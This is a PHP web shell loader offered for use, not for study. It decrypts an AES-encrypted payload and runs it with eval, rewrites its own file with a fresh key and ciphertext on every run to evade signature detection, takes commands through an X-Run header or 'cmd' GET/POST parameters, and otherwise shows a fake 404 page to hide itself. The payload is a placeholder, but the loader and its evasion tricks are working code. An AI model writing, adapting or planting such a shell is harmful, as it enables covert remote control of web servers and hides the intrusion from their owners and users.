<?php
// Fixed PHP loader that uses the correct decryption method
$key = "my_secret_key"; // Will be replaced with your secret key

// Encrypted payload (will be replaced with actual encrypted shell)
$payload = "ENCRYPTED_PAYLOAD_PLACEHOLDER";

// Decrypt and execute shell using Method 4 (SHA256 hash with OPENSSL_RAW_DATA)
$iv = substr(md5($key), 0, 16);
$key_hash = hash('sha256', $key, true);
$encrypted_data = base64_decode($payload);
$shell_code = @openssl_decrypt($encrypted_data, "AES-256-CBC", $key_hash, OPENSSL_RAW_DATA, $iv);

// Execute the shell and make it polymorphic
if ($shell_code) {
    // Self-modifying: change the encryption key each time
    $new_key = bin2hex(random_bytes(8));
    $new_iv = substr(md5($new_key), 0, 16);
    $new_key_hash = hash('sha256', $new_key, true);
    $new_payload = base64_encode(openssl_encrypt($shell_code, "AES-256-CBC", $new_key_hash, OPENSSL_RAW_DATA, $new_iv));
    
    // Update the file with new key and payload
    $current_content = file_get_contents(__FILE__);
    $new_content = preg_replace(
        ['/\$key = ".*?";/', '/\$payload = ".*?";/'],
        ["\$key = \"$new_key\";", "\$payload = \"$new_payload\";"],
        $current_content
    );
    
    // Write the modified content back to the file
    if ($new_content !== $current_content) {
        @file_put_contents(__FILE__, $new_content);
    }
    
    // Execute the shell code
    eval($shell_code);
}

// If no command was processed, display a harmless 404 page
if (!isset($_SERVER['HTTP_X_RUN']) && !isset($_POST['cmd']) && !isset($_GET['cmd'])) {
    header('HTTP/1.0 404 Not Found');
    echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>';
}
?>
